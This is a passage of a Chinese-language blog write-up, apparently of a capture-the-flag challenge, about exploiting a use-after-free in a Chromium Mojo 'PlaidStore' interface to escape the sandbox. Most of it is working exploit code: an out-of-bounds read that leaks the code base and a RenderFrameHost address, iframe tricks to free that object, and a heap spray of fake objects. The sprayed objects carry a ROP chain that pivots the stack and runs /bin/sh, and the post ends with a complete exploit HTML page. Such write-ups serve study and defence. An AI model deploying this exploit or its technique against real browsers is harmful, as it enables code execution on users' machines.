class="number">0</span>);</span><br><span class="line">uaf_ta[<span class="number">9</span>] = BigInt(pop_rax_ret);</span><br><span class="line">uaf_ta[<span class="number">10</span>] = BigInt(<span class="number">59</span>);</span><br><span class="line">uaf_ta[<span class="number">11</span>] = BigInt(syscall);</span><br><span class="line">uaf_ta[(<span class="number">0x10</span>+<span class="number">0x160</span>)/<span class="number">8</span>] = BigInt(xchg);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> uaf_uint8 = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(uaf_ab); <span class="comment">// /bin/sh\x00</span></span><br><span class="line">uaf_uint8[<span class="number">0x10</span>+<span class="number">0x160</span>+<span class="number">8</span>+<span class="number">0</span>] = <span class="number">0x2f</span>;</span><br><span class="line">uaf_uint8[<span class="number">0x10</span>+<span class="number">0x160</span>+<span class="number">8</span>+<span class="number">1</span>] = <span class="number">0x62</span>;</span><br><span class="line">uaf_uint8[<span class="number">0x10</span>+<span class="number">0x160</span>+<span class="number">8</span>+<span class="number">2</span>] = <span class="number">0x69</span>;</span><br><span class="line">uaf_uint8[<span class="number">0x10</span>+<span class="number">0x160</span>+<span class="number">8</span>+<span class="number">3</span>] = <span class="number">0x6e</span>;</span><br><span class="line">uaf_uint8[<span class="number">0x10</span>+<span class="number">0x160</span>+<span class="number">8</span>+<span class="number">4</span>] = <span class="number">0x2f</span>;</span><br><span class="line">uaf_uint8[<span class="number">0x10</span>+<span class="number">0x160</span>+<span class="number">8</span>+<span class="number">5</span>] = <span class="number">0x73</span>;</span><br><span class="line">uaf_uint8[<span class="number">0x10</span>+<span class="number">0x160</span>+<span class="number">8</span>+<span class="number">6</span>] = <span class="number">0x68</span>;</span><br><span class="line">uaf_uint8[<span class="number">0x10</span>+<span class="number">0x160</span>+<span class="number">8</span>+<span class="number">7</span>] = <span class="number">0x00</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"heap spray"</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; try_size; i++)&#123; <span class="comment">//heap spray</span></span><br><span class="line">    <span class="comment">//await ptr.storeData('1', new Array(kRenderFrameHost).fill(0x32));</span></span><br><span class="line">    <span class="keyword">await</span> ptr.storeData(<span class="string">""</span>+i, <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(uaf_ab));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-09-22-160738.jpg" alt=""></p>
<p><strong>值得提到的一点是</strong>，虽然我们为storeData传入的是一个TypedArray，并在其ArrayBuffer里伪造了数据，但最终我们传到browser侧的实例里的storeData函数的仍然仅仅是一个<code>vector&lt;uint8_t&gt;</code>，ArrayBuffer里伪造的数据就是vector的内容。</p>
<p>这里我们使用一个Array一样可以占位，演示如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">修改代码为await ptr.storeData(&#39;1&#39;, new Array(kRenderFrameHost).fill(0x32));</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">[0922&#x2F;095837.359069:INFO:CONSOLE(159)] &quot;heap spray&quot;, source: http:&#x2F;&#x2F;localhost:8000&#x2F;trigger.html (159)</span><br><span class="line"></span><br><span class="line">Thread 1 &quot;chrome&quot; received signal SIGSEGV, Segmentation fault.</span><br><span class="line"></span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0x3232323232323232 (&#39;22222222&#39;)</span><br></pre></td></tr></table></figure>
<p>可以看出从我们伪造的<code>render_frame_host_</code>里取出到rax的vtable entry是<code>0x3232323232323232</code>，和我们保存在array里的数据是完全一致的。<br>所以这里使用ArrayBuffer和TypedArray仅仅只是为了书写便利，没有额外的原因。</p>
<ul>
<li>父子iframe之间的通信</li>
</ul>
<p>最后需要提到的一点是，由于我们需要劫持rsp到被释放的<code>render_frame_host_</code>上，而这个<code>render_frame_host_</code>在我们的这个exploit里是child iframe的<code>render_frame_host_</code></p>
<p>所以就要在child iframe里调用oob函数来leak出<code>render_frame_host_</code>，而不是在parent里，这样就涉及到如何将child iframe里leak出来的地址传给parent。</p>
<p>这里我采用的方法是将leak出来的地址作为一个新的dom节点插入进去，然后在free掉child iframe之前，在parent里，通过<code>window.frames[0].window.document.getElementById</code>的方式拿到child iframe的window，也就是拿到里面的所有dom节点，从而拿到在child iframe里leak出来的地址。</p>
<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-09-22-171201.png" alt=""></p>
<h3 id="完整exploit"><a href="#完整exploit" class="headerlink" title="完整exploit"></a>完整exploit</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;script src=<span class="string">"./mojo/public/js/mojo_bindings.js"</span>&gt;&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">    &lt;script src="./</span>third_party/blink/public/mojom/plaidstore/plaidstore.mojom.js<span class="string">"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;script&gt;</span></span><br><span class="line"><span class="string">      function gc() &#123; for (let i = 0; i &lt; 0x10; i++) &#123; new ArrayBuffer(0x1000000); &#125; &#125;</span></span><br><span class="line"><span class="string">      var f64 = new Float64Array(1);</span></span><br><span class="line"><span class="string">      var u32 = new Uint32Array(f64.buffer);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      function d2u(v) &#123;</span></span><br><span class="line"><span class="string">          f64[0] = v;</span></span><br><span class="line"><span class="string">          return u32;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      function u2d(lo, hi) &#123;</span></span><br><span class="line"><span class="string">          u32[0] = lo;</span></span><br><span class="line"><span class="string">          u32[1] = hi;</span></span><br><span class="line"><span class="string">          return f64[0];</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">      </span></span><br><span class="line"><span class="string">      function b2i(bytes)&#123;</span></span><br><span class="line"><span class="string">          var value = 0;</span></span><br><span class="line"><span class="string">          for(var i = 0; i &lt; 8; i++)&#123;</span></span><br><span class="line"><span class="string">              value = value * 0x100 + bytes[7-i];</span></span><br><span class="line"><span class="string">          &#125;</span></span><br><span class="line"><span class="string">          return value;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">      function hex(i)&#123;</span></span><br><span class="line"><span class="string">          return '0x' + i.toString(16);</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      // for child</span></span><br><span class="line"><span class="string">      function r2p_rfh(render_frame_host_addr)&#123;</span></span><br><span class="line"><span class="string">        addElement(render_frame_host_addr,"</span>render_frame_host_addr<span class="string">");</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      function r2p_code_base(code_base)&#123;</span></span><br><span class="line"><span class="string">        addElement(code_base, "</span>code_base<span class="string">");</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      function addElement(value, id) &#123;</span></span><br><span class="line"><span class="string">        // 创建一个新的 div 元素</span></span><br><span class="line"><span class="string">        let newDiv = document.createElement("</span>div<span class="string">"); </span></span><br><span class="line"><span class="string">        newDiv.setAttribute("</span>id<span class="string">", id);</span></span><br><span class="line"><span class="string">        let newContent = document.createTextNode(value); </span></span><br><span class="line"><span class="string">        // 添加文本节点 到这个新的 div 元素</span></span><br><span class="line"><span class="string">        newDiv.appendChild(newContent); </span></span><br><span class="line"><span class="string">        // 将这个新的元素和它的文本添加到 DOM 中</span></span><br><span class="line"><span class="string">        document.body.appendChild(newDiv); </span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      function allocateRFH(src) &#123;</span></span><br><span class="line"><span class="string">        var iframe = document.createElement("</span>iframe<span class="string">");</span></span><br><span class="line"><span class="string">        iframe.src = src;</span></span><br><span class="line"><span class="string">        document.body.appendChild(iframe);</span></span><br><span class="line"><span class="string">        return iframe;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      function freeRFH(iframe) &#123;</span></span><br><span class="line"><span class="string">        document.body.removeChild(iframe);</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      var kPwnInterfaceName = "</span>pwn<span class="string">";</span></span><br><span class="line"><span class="string">      function sendPtr() &#123;</span></span><br><span class="line"><span class="string">        var pipe = Mojo.createMessagePipe();</span></span><br><span class="line"><span class="string">        // bind the PlaidStore with the child rfh</span></span><br><span class="line"><span class="string">        Mojo.bindInterface(blink.mojom.PlaidStore.name,</span></span><br><span class="line"><span class="string">          pipe.handle1, "</span>context<span class="string">", true);</span></span><br><span class="line"><span class="string">        // pass the endpoint handle to the parent rfh</span></span><br><span class="line"><span class="string">        Mojo.bindInterface(kPwnInterfaceName, pipe.handle0, "</span>process<span class="string">");</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      function getFreedPtr() &#123;</span></span><br><span class="line"><span class="string">        return new Promise(function (resolve, reject) &#123;</span></span><br><span class="line"><span class="string">          // create child iframe, allocate new RenderFrameHost</span></span><br><span class="line">          var frame = allocateRFH(window.location.href + "#child"); // designate the child by hash</span><br><span class="line">          <span class="comment">// intercept bindInterface calls for this process to accept the handle from the child</span></span><br><span class="line">          <span class="keyword">let</span> interceptor = <span class="keyword">new</span> MojoInterfaceInterceptor(kPwnInterfaceName, <span class="string">"process"</span>);</span><br><span class="line">          interceptor.oninterfacerequest = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">            <span class="comment">// e is MojoInterfaceRequestEvent</span></span><br><span class="line">            interceptor.stop();</span><br><span class="line">            <span class="comment">// bind the remote</span></span><br><span class="line">            <span class="keyword">var</span> plaid_store_ptr = <span class="keyword">new</span> blink.mojom.PlaidStorePtr(e.handle);</span><br><span class="line">            <span class="comment">// get child iframe render_frame_host_addr</span></span><br><span class="line">            <span class="comment">// console.log(window.frames[0].window.document.getElementById('render_frame_host_addr').innerText);</span></span><br><span class="line">            <span class="comment">// console.log(window.frames[0].window.document.getElementById('code_base').innerText);</span></span><br><span class="line">            iframe_render_frame_host_addr = <span class="built_in">parseInt</span>(<span class="built_in">window</span>.frames[<span class="number">0</span>].window.document.getElementById(<span class="string">'render_frame_host_addr'</span>).innerText);</span><br><span class="line">            code_base = <span class="built_in">parseInt</span>(<span class="built_in">window</span>.frames[<span class="number">0</span>].window.document.getElementById(<span class="string">'code_base'</span>).innerText);</span><br><span class="line">            freeRFH(frame);</span><br><span class="line">            resolve(plaid_store_ptr);</span><br><span class="line">          &#125;</span><br><span class="line">          interceptor.start();</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">trigger</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// for #child</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">window</span>.location.hash == <span class="string">"#child"</span>) &#123;</span><br><span class="line">          <span class="keyword">await</span> oob();</span><br><span class="line">          sendPtr();</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// for #parent</span></span><br><span class="line">        iframe_render_frame_host_addr = <span class="number">0</span>;</span><br><span class="line">        code_base = <span class="number">0</span></span><br><span class="line">        <span class="keyword">var</span> try_size = <span class="number">100</span>;</span><br><span class="line">        <span class="keyword">var</span> kRenderFrameHost = <span class="number">0xc28</span>;</span><br><span class="line">        <span class="keyword">let</span> ptr = <span class="keyword">await</span> getFreedPtr();<span class="comment">// free iframe </span></span><br><span class="line">        <span class="comment">// leak addr</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'code_base2 is: '</span>, hex(code_base));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'render_frame_host_addr2 is: '</span>, hex(iframe_render_frame_host_addr));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> xchg = code_base+<span class="number">0x880dee8</span>; <span class="comment">// xchg rsp, rax; clc; pop rbp; ret;</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"xchg gadget: "</span>, xchg);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> pop_rdi_ret = code_base+<span class="number">0x2e4630f</span>;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'pop_rdi_ret: '</span>, pop_rdi_ret);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> pop_rsi_ret = code_base+<span class="number">0x2d278d2</span>;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'pop_rsi_ret: '</span>, pop_rsi_ret);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> pop_rdx_ret = code_base+<span class="number">0x2e9998e</span>;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'pop_rdx_ret: '</span>, pop_rdx_ret);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> pop_rax_ret = code_base+<span class="number">0x2e651dd</span>;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'pop_rax_ret: '</span>, pop_rax_ret);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> syscall = code_base+<span class="number">0x2ef528d</span>;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'syscall: '</span>, syscall);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">var</span> uaf_ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(kRenderFrameHost);</span><br><span class="line">        <span class="keyword">var</span> uaf_ta = <span class="keyword">new</span> BigUint64Array(uaf_ab);</span><br><span class="line">        uaf_ta[<span class="number">0</span>] = BigInt(iframe_render_frame_host_addr)+<span class="number">0x10n</span>;</span><br><span class="line">        uaf_ta[<span class="number">1</span>] = <span class="number">0n</span>;</span><br><span class="line">        uaf_ta[<span class="number">2</span>] = <span class="number">0n</span>; <span class="comment">//use by pop rbp</span></span><br><span class="line">        uaf_ta[<span class="number">3</span>] = BigInt(pop_rdi_ret);</span><br><span class="line">        uaf_ta[<span class="number">4</span>] = BigInt(iframe_render_frame_host_addr)+<span class="number">0x10n</span>+<span class="number">0x160n</span>+<span class="number">8n</span>;</span><br><span class="line">        uaf_ta[<span class="number">5</span>] = BigInt(pop_rsi_ret);</span><br><span class="line">        uaf_ta[<span class="number">6</span>] = BigInt(<span class="number">0</span>);</span><br><span class="line">        uaf_ta[<span class="number">7</span>] = BigInt(pop_rdx_ret);</span><br><span class="line">        uaf_ta[<span class="number">8</span>] = BigInt(<span class="number">0</span>);</span><br><span class="line">        uaf_ta[<span class="number">9</span>] = BigInt(pop_rax_ret);</span><br><span class="line">        uaf_ta[<span class="number">10</span>] = BigInt(<span class="number">59</span>);</span><br><span class="line">        uaf_ta[<span class="number">11</span>] = BigInt(syscall);</span><br><span class="line">        uaf_ta[(<span class="number">0x10</span>+<span class="number">0x160</span>)/<span class="number">8</span>] = BigInt(xchg);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> uaf_uint8 = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(uaf_ab); <span class="comment">// /bin/sh\x00</span></span><br><span class="line">        uaf_uint8[<span class="number">0x10</span>+<span class="number">0x160</span>+<span class="number">8</span>+<span class="number">0</span>] = <span class="number">0x2f</span>;</span><br><span class="line">        uaf_uint8[<span class="number">0x10</span>+<span class="number">0x160</span>+<span class="number">8</span>+<span class="number">1</span>] = <span class="number">0x62</span>;</span><br><span class="line">        uaf_uint8[<span class="number">0x10</span>+<span class="number">0x160</span>+<span class="number">8</span>+<span class="number">2</span>] = <span class="number">0x69</span>;</span><br><span class="line">        uaf_uint8[<span class="number">0x10</span>+<span class="number">0x160</span>+<span class="number">8</span>+<span class="number">3</span>] = <span class="number">0x6e</span>;</span><br><span class="line">        uaf_uint8[<span class="number">0x10</span>+<span class="number">0x160</span>+<span class="number">8</span>+<span class="number">4</span>] = <span class="number">0x2f</span>;</span><br><span class="line">        uaf_uint8[<span class="number">0x10</span>+<span class="number">0x160</span>+<span class="number">8</span>+<span class="number">5</span>] = <span class="number">0x73</span>;</span><br><span class="line">        uaf_uint8[<span class="number">0x10</span>+<span class="number">0x160</span>+<span class="number">8</span>+<span class="number">6</span>] = <span class="number">0x68</span>;</span><br><span class="line">        uaf_uint8[<span class="number">0x10</span>+<span class="number">0x160</span>+<span class="number">8</span>+<span class="number">7</span>] = <span class="number">0x00</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"heap spray"</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; try_size; i++)&#123; </span><br><span class="line">          <span class="comment">//await ptr.storeData('1', new Array(kRenderFrameHost).fill(0x32));</span></span><br><span class="line">          <span class="keyword">await</span> ptr.storeData(<span class="string">""</span>+i, <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(uaf_ab));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'getshell'</span>);</span><br><span class="line">        ptr.getData(<span class="string">"1"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">oob</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"oob"</span>);</span><br><span class="line">        <span class="keyword">var</span> ps_list = [];</span><br><span class="line">        <span class="keyword">var</span> try_size = <span class="number">100</span>;</span><br><span class="line">        <span class="keyword">var</span> vt_addr = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">var</span> render_frame_host_addr = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">var</span> code_base = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; try_size; i++)&#123;</span><br><span class="line">          <span class="keyword">var</span> pipe = Mojo.createMessagePipe();</span><br><span class="line">          Mojo.bindInterface(blink.mojom.PlaidStore.name,</span><br><span class="line">            pipe.handle1, <span class="string">"context"</span>, <span class="literal">true</span>);</span><br><span class="line">          <span class="keyword">var</span> tmp_ps_ptr = <span class="keyword">new</span> blink.mojom.PlaidStorePtr(pipe.handle0);</span><br><span class="line">          <span class="keyword">await</span> tmp_ps_ptr.storeData(<span class="string">"aaaa"</span>, <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x30</span>).fill(<span class="number">0x31</span>))</span><br><span class="line">          ps_list.push(tmp_ps_ptr);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; try_size; i++)&#123;</span><br><span class="line">          <span class="keyword">if</span>(vt_addr != <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">var</span> tmp_ps_ptr = ps_list[i];</span><br><span class="line">          <span class="keyword">let</span> r = <span class="keyword">await</span> tmp_ps_ptr.getData(<span class="string">"aaaa"</span>, <span class="number">0x100</span>);</span><br><span class="line">          <span class="keyword">let</span> oob_data = r.data;</span><br><span class="line">          <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0x30</span>; i &lt; <span class="number">0x100</span>; i = i + <span class="number">8</span>)&#123;</span><br><span class="line">            <span class="keyword">let</span> tmp_oob_data = b2i(oob_data.slice(i, i+<span class="number">8</span>));</span><br><span class="line">            <span class="keyword">if</span>(hex(tmp_oob_data &amp; <span class="number">0xfff</span>) == <span class="string">"0x7a0"</span>)&#123;</span><br><span class="line">                vt_addr = tmp_oob_data;</span><br><span class="line">                code_base = vt_addr - <span class="number">0x9fb67a0</span>;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">'vt_addr is: '</span>, hex(vt_addr));</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">'code_base is: '</span>, hex(code_base));</span><br><span class="line">                render_frame_host_addr = b2i(oob_data.slice(i+<span class="number">8</span>, i+<span class="number">16</span>));</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">'render_frame_host_addr is: '</span>, hex(render_frame_host_addr));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        r2p_rfh(hex(render_frame_host_addr));</span><br><span class="line">        r2p_code_base(hex(code_base));</span><br><span class="line">      &#125;</span><br><span class="line">  &lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>head&gt;</span><br><span class="line">  &lt;body onload=<span class="string">"trigger()"</span>&gt;&lt;<span class="regexp">/body&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>html&gt;</span><br></pre></td></tr></table></figure>
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/cpp/" rel="tag"># cpp</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2020/08/23/afl/" rel="next" title="sakuraのAFL源码全注释">
                <i class="fa fa-chevron-left"></i> sakuraのAFL源码全注释
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2021/01/31/nas/" rel="prev" title="Western Digital My Cloud Pro系列PR4100 NAS认证前RCE漏洞分析与利用">
                Western Digital My Cloud Pro系列PR4100 NAS认证前RCE漏洞分析与利用 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  
    <div class="comments" id="comments">
    </div>
  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/sakura_heart.png"
                alt="sakura" />
            
              <p class="site-author-name" itemprop="name">sakura</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/%7C%7C%20archive">
              
                  <span class="site-state-item-count">99</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">18</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">49</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/eternalsakura" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:eternalsakura13@gmail.com" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://www.zhihu.com/people/sakura1328/activities" target="_blank" title="知乎">
                      
                        <i class="fa fa-fw fa-globe"></i>知乎</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://twitter.com/eternalsakura13" target="_blank" title="Twitter">
                      
                        <i class="fa fa-fw fa-twitter"></i>Twitter</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://kiprey.github.io/" title="Kiprey" target="_blank">Kiprey</a>
                  </li>
                
